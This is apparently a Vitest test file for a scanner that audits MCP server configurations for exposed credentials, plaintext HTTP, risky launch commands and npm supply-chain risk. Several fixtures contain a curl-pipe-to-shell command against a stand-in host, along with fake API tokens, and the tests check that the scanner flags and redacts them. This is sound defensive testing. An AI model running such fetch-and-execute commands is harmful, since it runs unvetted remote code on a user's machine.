import { afterEach, describe, expect, it, vi } from "vitest";
import {
  ALL_CHECKS,
  redactSecret,
  redactUrlCredentials,
  redactUrlsInText,
  urlHasCredentials,
  urlQueryCredentials,
  looksLikePlaceholder,
  stripVersion,
} from "../src/scanner/checks.js";
import { runChecks } from "../src/scanner/engine.js";
import type { CheckContext, McpServerDef } from "../src/scanner/types.js";

const CTX: CheckContext = { offline: true };

function stdio(over: Partial<McpServerDef> = {}): McpServerDef {
  return { name: "s", transport: "stdio", command: "node", args: ["server.js"], env: {}, ...over };
}

function remote(over: Partial<McpServerDef> = {}): McpServerDef {
  return { name: "r", transport: "http", url: "https://api.example.com/mcp", headers: {}, ...over };
}

async function run(id: string, server: McpServerDef) {
  const check = ALL_CHECKS.find((c) => c.id === id)!;
  return await check.run(server, CTX);
}

describe("redactSecret", () => {
  it("never leaks the full value", () => {
    const secret = "ghp_" + "f".repeat(36);
    const redacted = redactSecret(secret);
    expect(redacted).not.toContain(secret);
    expect(redacted.startsWith("ghp_")).toBe(true);
  });
});

describe("looksLikePlaceholder", () => {
  it.each(["${API_KEY}", "<your-key>", "xxx", "changeme", "", "YOUR_API_KEY"])(
    "treats %s as placeholder",
    (v) => expect(looksLikePlaceholder(v)).toBe(true)
  );
  it("does not flag real-looking values", () => {
    expect(looksLikePlaceholder("ghp_" + "f".repeat(36))).toBe(false);
  });
});

describe("stripVersion", () => {
  it.each([
    ["pkg@1.2.3", "pkg"],
    ["@scope/pkg@1.2.3", "@scope/pkg"],
    ["@scope/pkg", "@scope/pkg"],
    ["pkg", "pkg"],
  ])("strips %s to %s", (in_, out) => expect(stripVersion(in_)).toBe(out));
});

describe("no-auth", () => {
  it("flags remote servers without credentials", async () => {
    const findings = (await run("no-auth", remote())) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
  });
  it("passes when an Authorization header exists (any case)", async () => {
    const findings = (await run(
      "no-auth",
      remote({ headers: { authorization: "Bearer x" } })
    )) as any[];
    expect(findings).toHaveLength(0);
  });
  it("ignores stdio servers", async () => {
    expect((await run("no-auth", stdio())) as any[]).toHaveLength(0);
  });
});

describe("plaintext-http", () => {
  it("flags http:// on non-loopback as high", async () => {
    const findings = (await run(
      "plaintext-http",
      remote({ url: "http://192.168.1.5:8080/mcp" })
    )) as any[];
    expect(findings[0].severity).toBe("high");
  });
  it("downgrades loopback http to info", async () => {
    const findings = (await run(
      "plaintext-http",
      remote({ url: "http://127.0.0.1:8080/mcp" })
    )) as any[];
    expect(findings[0].severity).toBe("info");
  });
  it("passes https", async () => {
    expect((await run("plaintext-http", remote())) as any[]).toHaveLength(0);
  });
});

describe("wildcard-bind", () => {
  it("flags 0.0.0.0", async () => {
    const findings = (await run(
      "wildcard-bind",
      remote({ url: "http://0.0.0.0:8080/mcp" })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("medium");
  });
});

describe("urlHasCredentials / redactUrlCredentials", () => {
  it("detects user:password and bare-token userinfo", () => {
    expect(urlHasCredentials("https://user:pass@example.com/mcp")).toBe(true);
    expect(urlHasCredentials("https://sometoken123@example.com/mcp")).toBe(true);
    expect(urlHasCredentials("https://example.com/mcp")).toBe(false);
    expect(urlHasCredentials("not a url")).toBe(false);
  });
  it("replaces userinfo with a placeholder, keeping host and path", () => {
    expect(redactUrlCredentials("https://user:s3cret@example.com:8443/mcp?q=1")).toBe(
      "https://•••@example.com:8443/mcp?q=1"
    );
    expect(redactUrlCredentials("https://token123@example.com/mcp")).toBe(
      "https://•••@example.com/mcp"
    );
  });
  it("leaves clean and malformed URLs unchanged", () => {
    expect(redactUrlCredentials("https://example.com/mcp")).toBe(
      "https://example.com/mcp"
    );
    expect(redactUrlCredentials("not a url")).toBe("not a url");
  });
  it("redacts credential query values, keeping benign params intact", () => {
    expect(
      redactUrlCredentials("https://example.com/mcp?api_key=tok123&q=hello&page=2")
    ).toBe("https://example.com/mcp?api_key=•••&q=hello&page=2");
    expect(
      redactUrlCredentials("https://user:s3cret@example.com/mcp?token=tok123&q=1")
    ).toBe("https://•••@example.com/mcp?token=•••&q=1");
  });
});

describe("redactUrlsInText", () => {
  it("redacts credentialed URLs inside longer text", () => {
    expect(
      redactUrlsInText(
        "sudo node server.js --url https://admin:s3cret@internal.example.com/mcp"
      )
    ).toBe("sudo node server.js --url https://•••@internal.example.com/mcp");
    expect(
      redactUrlsInText("curl https://example.com/i.sh?token=tok123 | sh")
    ).toBe("curl https://example.com/i.sh?token=••• | sh");
  });
  it("leaves clean URLs and plain text untouched", () => {
    expect(redactUrlsInText("npx -y some-pkg --url https://example.com/mcp")).toBe(
      "npx -y some-pkg --url https://example.com/mcp"
    );
    expect(redactUrlsInText("just some words")).toBe("just some words");
  });
});

describe("urlQueryCredentials", () => {
  it("detects credential-bearing query params, case-insensitively", () => {
    expect(urlQueryCredentials("https://example.com/mcp?api_key=x")).toEqual([
      "api_key",
    ]);
    expect(urlQueryCredentials("https://example.com/mcp?TOKEN=x&Api_Key=y")).toEqual([
      "token",
      "api_key",
    ]);
    expect(urlQueryCredentials("https://example.com/mcp?access_token=x")).toEqual([
      "access_token",
    ]);
  });
  it("ignores benign params and malformed URLs", () => {
    expect(urlQueryCredentials("https://example.com/mcp?q=hello&page=2")).toEqual([]);
    expect(urlQueryCredentials("not a url")).toEqual([]);
  });
});

describe("url-query-credentials", () => {
  it("flags a query-string credential as high with redacted evidence", async () => {
    const findings = (await run(
      "url-query-credentials",
      remote({ url: "https://example.com/mcp?api_key=tok1234567890" })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(findings[0].evidence).toBe("url: https://example.com/mcp?api_key=•••");
    expect(JSON.stringify(findings[0])).not.toContain("tok1234567890");
  });
  it("flags token and access_token params, passes benign queries", async () => {
    expect(
      (await run(
        "url-query-credentials",
        remote({ url: "https://example.com/mcp?token=abc123" })
      )) as any[]
    ).toHaveLength(1);
    expect(
      (await run(
        "url-query-credentials",
        remote({ url: "https://example.com/mcp?q=hello&page=2" })
      )) as any[]
    ).toHaveLength(0);
    expect((await run("url-query-credentials", stdio())) as any[]).toHaveLength(0);
  });
  it("suppresses the misleading no-auth finding for query-token URLs", async () => {
    expect(
      (await run(
        "no-auth",
        remote({ url: "https://example.com/mcp?api_key=tok1234567890" })
      )) as any[]
    ).toHaveLength(0);
  });
  it("never leaks the query credential anywhere in a full offline scan", async () => {
    const token = "sk-ant-" + "A".repeat(32);
    const report = await runChecks(
      [remote({ url: `http://example.com/mcp?api_key=${token}` })],
      { offline: true }
    );
    expect(report.findings.map((f) => f.checkId)).toContain("url-query-credentials");
    expect(report.findings.map((f) => f.checkId)).toContain("plaintext-http");
    expect(JSON.stringify(report)).not.toContain(token);
  });
});

describe("url-credentials", () => {
  const CRED_URL = "https://user:s3cretpass@example.com/mcp";
  it("flags userinfo credentials as high with redacted evidence", async () => {
    const findings = (await run("url-credentials", remote({ url: CRED_URL }))) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(findings[0].evidence).toBe("url: https://•••@example.com/mcp");
    expect(JSON.stringify(findings[0])).not.toContain("s3cretpass");
  });
  it("flags a bare token used as the username", async () => {
    const findings = (await run(
      "url-credentials",
      remote({ url: "https://tok123456789@example.com/mcp" })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(JSON.stringify(findings[0])).not.toContain("tok123456789");
  });
  it("passes clean URLs and ignores stdio servers", async () => {
    expect((await run("url-credentials", remote())) as any[]).toHaveLength(0);
    expect((await run("url-credentials", stdio())) as any[]).toHaveLength(0);
  });
  it("suppresses the misleading no-auth finding for userinfo URLs", async () => {
    expect((await run("no-auth", remote({ url: CRED_URL }))) as any[]).toHaveLength(0);
  });
  it("redacts userinfo from other URL evidence", async () => {
    const plain = (await run(
      "plaintext-http",
      remote({ url: "http://user:s3cretpass@example.com/mcp" })
    )) as any[];
    expect(plain).toHaveLength(1);
    expect(plain[0].evidence).toBe("url: http://•••@example.com/mcp");
    expect(JSON.stringify(plain[0])).not.toContain("s3cretpass");
    const wild = (await run(
      "wildcard-bind",
      remote({ url: "http://user:s3cretpass@0.0.0.0:8080/mcp" })
    )) as any[];
    expect(wild).toHaveLength(1);
    expect(JSON.stringify(wild[0])).not.toContain("s3cretpass");
  });
  it("never leaks the credential anywhere in a full offline scan", async () => {
    const report = await runChecks(
      [remote({ url: "http://user:s3cretpass@example.com/mcp" })],
      { offline: true }
    );
    expect(report.findings.map((f) => f.checkId)).toContain("url-credentials");
    expect(JSON.stringify(report)).not.toContain("s3cretpass");
  });
});

describe("hardcoded-secret", () => {
  it("flags a GitHub token in env and redacts it", async () => {
    const secret = "ghp_" + "f".repeat(36);
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { GITHUB_TOKEN: secret } })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(JSON.stringify(findings[0])).not.toContain(secret);
  });
  it("flags secrets in headers too", async () => {
    const findings = (await run(
      "hardcoded-secret",
      remote({ headers: { "X-Api-Key": "sk-ant-" + "0".repeat(32) } })
    )) as any[];
    expect(findings).toHaveLength(1);
  });
  it("ignores ${VAR} placeholders", async () => {
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { GITHUB_TOKEN: "${GITHUB_TOKEN}", OTHER: "xxx" } })
    )) as any[];
    expect(findings).toHaveLength(0);
  });
  it("flags long high-entropy values under sensitive names", async () => {
    const findings = (await run(
      "hardcoded-secret",
      stdio({ env: { MY_SECRET: "aB3dE5fG7hJ9kL1mN3pQ5rS7t" } })
    )) as any[];
    expect(findings).toHaveLength(1);
  });
  it("flags a GitHub token passed as a stdio argument", async () => {
    const secret = "ghp_" + "f".repeat(36);
    const findings = (await run(
      "hardcoded-secret",
      stdio({ args: ["server.js", "--api-key", secret] })
    )) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(findings[0].evidence).toBe("args[2] = ghp_…••••••••");
    expect(JSON.stringify(findings[0])).not.toContain(secret);
  });
  it("flags a long value handed to a sensitive flag, and inline --flag=value secrets", async () => {
    const opaque = "aB3dE5fG7hJ9kL1mN3pQ5rS7t";
    const byFlag = (await run(
      "hardcoded-secret",
      stdio({ args: ["server.js", "--api-key", opaque] })
    )) as any[];
    expect(byFlag).toHaveLength(1);
    expect(byFlag[0].evidence).toBe("args[2] = aB3d…••••••••");
    const inline = (await run(
      "hardcoded-secret",
      stdio({ args: ["server.js", "--token=xoxb-" + "1".repeat(12)] })
    )) as any[];
    expect(inline).toHaveLength(1);
    expect(JSON.stringify(inline[0])).not.toContain("xoxb-111111111111");
  });
  it("ignores benign args, flags, and placeholders", async () => {
    const findings = (await run(
      "hardcoded-secret",
      stdio({
        args: ["server.js", "--verbose", "--port", "3000", "--token", "${MY_TOKEN}"],
      })
    )) as any[];
    expect(findings).toHaveLength(0);
  });
});

describe("risky-stdio-command", () => {
  it("flags curl|sh as critical", async () => {
    const findings = (await run(
      "risky-stdio-command",
      stdio({ command: "bash", args: ["-c", "curl https://x.example/i.sh | sh"] })
    )) as any[];
    expect(findings[0].severity).toBe("critical");
  });
  it("flags sudo as high", async () => {
    const findings = (await run(
      "risky-stdio-command",
      stdio({ command: "sudo", args: ["node", "server.js"] })
    )) as any[];
    expect(findings.some((f: any) => f.severity === "high")).toBe(true);
  });
  it("flags unpinned npx -y as medium, passes pinned", async () => {
    const bad = (await run(
      "risky-stdio-command",
      stdio({ command: "npx", args: ["-y", "some-pkg"] })
    )) as any[];
    expect(bad.some((f: any) => f.severity === "medium")).toBe(true);
    const good = (await run(
      "risky-stdio-command",
      stdio({ command: "npx", args: ["-y", "some-pkg@1.2.3"] })
    )) as any[];
    expect(good.filter((f: any) => /Unpinned/.test(f.message))).toHaveLength(0);
  });
  it("ignores remote servers", async () => {
    expect((await run("risky-stdio-command", remote())) as any[]).toHaveLength(0);
  });
  it("redacts credentialed URLs from command-line evidence", async () => {
    const sudo = (await run(
      "risky-stdio-command",
      stdio({
        command: "sudo",
        args: ["node", "server.js", "--url", "https://admin:s3cretpass@internal.example.com/mcp"],
      })
    )) as any[];
    expect(sudo).toHaveLength(1);
    expect(sudo[0].evidence).toBe(
      "command: sudo node server.js --url https://•••@internal.example.com/mcp"
    );
    expect(JSON.stringify(sudo[0])).not.toContain("s3cretpass");
    const piped = (await run(
      "risky-stdio-command",
      stdio({ command: "bash", args: ["-c", "curl https://user:tok123456@x.example/i.sh | sh"] })
    )) as any[];
    expect(piped).toHaveLength(1);
    expect(JSON.stringify(piped[0])).not.toContain("tok123456");
  });
  it("never leaks a credentialed URL anywhere in a full offline scan", async () => {
    const report = await runChecks(
      [
        stdio({
          name: "s",
          command: "sudo",
          args: ["node", "server.js", "--url", "https://admin:s3cretpass@internal.example.com/mcp"],
        }),
      ],
      { offline: true }
    );
    expect(report.findings.map((f) => f.checkId)).toContain("risky-stdio-command");
    expect(JSON.stringify(report)).not.toContain("s3cretpass");
  });
});

describe("npm-supply-chain", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  function packument(over: Record<string, unknown> = {}) {
    return {
      "dist-tags": { latest: "2.88.2" },
      time: { created: "2011-01-22T00:36:12.640Z" },
      versions: {
        "2.88.2": { deprecated: "request has been deprecated" },
      },
      ...over,
    };
  }

  function stubFetch(json: unknown, status = 200) {
    vi.stubGlobal(
      "fetch",
      async () =>
        ({
          status,
          ok: status >= 200 && status < 300,
          json: async () => json,
        }) as Response
    );
  }

  async function runOnline(server: McpServerDef) {
    const check = ALL_CHECKS.find((c) => c.id === "npm-supply-chain")!;
    return await check.run(server, { offline: false });
  }

  const npx = (pkg: string) =>
    stdio({ command: "npx", args: ["-y", pkg] });

  it("flags a deprecated latest version as medium", async () => {
    stubFetch(packument());
    const findings = (await runOnline(npx("request@2.88.2"))) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("medium");
    expect(findings[0].evidence).toBe("package: request@2.88.2 (deprecated)");
    expect(findings[0].message).toContain("request has been deprecated");
  });

  it("passes a maintained old package", async () => {
    stubFetch(
      packument({ versions: { "2.88.2": {} } })
    );
    expect((await runOnline(npx("request@2.88.2"))) as any[]).toHaveLength(0);
  });

  it("does not flag when only an old version is deprecated", async () => {
    stubFetch(
      packument({
        "dist-tags": { latest: "2.0.0" },
        versions: {
          "1.0.0": { deprecated: "old version, do not use" },
          "2.0.0": {},
        },
      })
    );
    expect((await runOnline(npx("request@2.0.0"))) as any[]).toHaveLength(0);
  });

  it("flags a young package as before when latest is not deprecated", async () => {
    stubFetch(
      packument({
        "dist-tags": { latest: "0.1.0" },
        time: { created: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString() },
        versions: { "0.1.0": {} },
      })
    );
    const findings = (await runOnline(npx("fresh-pkg@0.1.0"))) as any[];
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain("(10d old)");
  });
});
